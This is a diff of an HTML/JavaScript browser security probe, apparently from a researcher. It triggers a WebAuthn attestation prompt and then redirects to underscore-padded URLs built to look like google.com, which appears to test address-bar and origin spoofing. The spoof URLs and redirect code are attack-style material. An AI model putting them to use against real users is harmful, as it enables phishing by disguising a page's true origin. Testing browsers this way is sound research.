@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WebAuthn Attestation &amp; Redirect Probe</title>
+<title>WebAuthn Attestation + Underscore Hostname Redirect Probe</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #121212; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; color: #e5e5e5; }
@@ -21,13 +21,13 @@
 <body>
 
 <div class="panel">
-  <h2>WebAuthn Attestation + Redirect Probe</h2>
-  <p>Memicu <code>navigator.credentials.create()</code> (<code>attestation: "direct"</code>) lalu mengarahkan ke <code>https://google.com____________________________________________________________.artha231.github.io/Safari-Iphone-/</code> sambil mencatat status <em>promise</em> dan siklus hidup halaman.</p>
+  <h2>WebAuthn Attestation + Underscore Hostname Redirect</h2>
+  <p>Memicu <code>navigator.credentials.create()</code> (<code>attestation: "direct"</code>) dan menguji redirect/parsing ke <code>https://?.________________________________________________________________________________________________________________________google.com/</code>.</p>
 
   <label for="redirectDelayMs">Jeda (ms) sebelum redirect:</label>
   <input id="redirectDelayMs" type="number" value="150" min="0" max="10000" />
 
-  <button id="runFullBtn">Trigger WebAuthn Attestation &amp; Redirect</button>
+  <button id="runTargetBtn">Trigger WebAuthn Attestation &amp; Redirect</button>
   <div id="log">[*] Ready...</div>
 </div>
 
@@ -35,9 +35,9 @@
 (function () {
   'use strict';
 
-  var TARGET_URL = 'https://google.com____________________________________________________________.artha231.github.io/Safari-Iphone-/';
+  var RAW_TARGET = 'https://?.________________________________________________________________________________________________________________________google.com/';
   var delayInput = document.getElementById('redirectDelayMs');
-  var runBtn = document.getElementById('runFullBtn');
+  var runBtn = document.getElementById('runTargetBtn');
   var logEl = document.getElementById('log');
   var t0 = performance.now();
 
@@ -46,7 +46,7 @@
     var line = `[+${elapsed}ms] ${msg}`;
     logEl.textContent += '\n' + line;
     logEl.scrollTop = logEl.scrollHeight;
-    console.log('[WebAuthnRedirectProbe] ' + line);
+    console.log('[UnderscoreTargetProbe] ' + line);
   }
 
   function randomBytes(len) {
@@ -68,10 +68,10 @@
   function inspectTargetUrl(url) {
     try {
       var parsed = new URL(url);
-      log(`[URL ok] hostname="${parsed.hostname}", pathname="${parsed.pathname}"`);
+      log(`[URL ok] hostname="${parsed.hostname}", pathname="${parsed.pathname}", search="${parsed.search}"`);
       return parsed.href;
     } catch (err) {
-      log(`[URL error] ${err.name}: ${err.message}`);
+      log(`[URL rejected] ${err.name}: ${err.message}`);
       return null;
     }
   }
@@ -96,7 +96,7 @@
         user: {
           id: randomBytes(16),
           name: 'probe@' + rpId,
-          displayName: 'WebAuthn Redirect Probe'
+          displayName: 'Underscore Target Probe'
         },
         pubKeyCredParams: [
           { type: 'public-key', alg: -7 },
@@ -120,19 +120,17 @@
     var delayMs = Math.max(0, Math.min(10000, parseInt(delayInput.value, 10) || 150));
 
     triggerWebAuthnAttestation();
-    var normalizedUrl = inspectTargetUrl(TARGET_URL);
-
-    queueMicrotask(function () {
-      log(`[microtask] queued redirect in ${delayMs}ms -> ${normalizedUrl || TARGET_URL}`);
-    });
-
-    requestAnimationFrame(function () {
-      log(`[rAF] before redirect -> href=${window.location.href}`);
-    });
+    var normalized = inspectTargetUrl(RAW_TARGET);
 
     setTimeout(function () {
-      log(`[*] Redirecting to ${normalizedUrl || TARGET_URL}...`);
-      window.location.href = normalizedUrl || TARGET_URL;
+      var targetToAssign = normalized || RAW_TARGET;
+      try {
+        var before = window.location.href;
+        window.location.href = targetToAssign;
+        log(`[*] window.location.href assigned -> "${targetToAssign}" (before="${before}", now="${window.location.href}")`);
+      } catch (navErr) {
+        log(`[-] Redirect error (${navErr.name}) -> ${navErr.message}`);
+      }
     }, delayMs);
   }, { once: true });
 })();
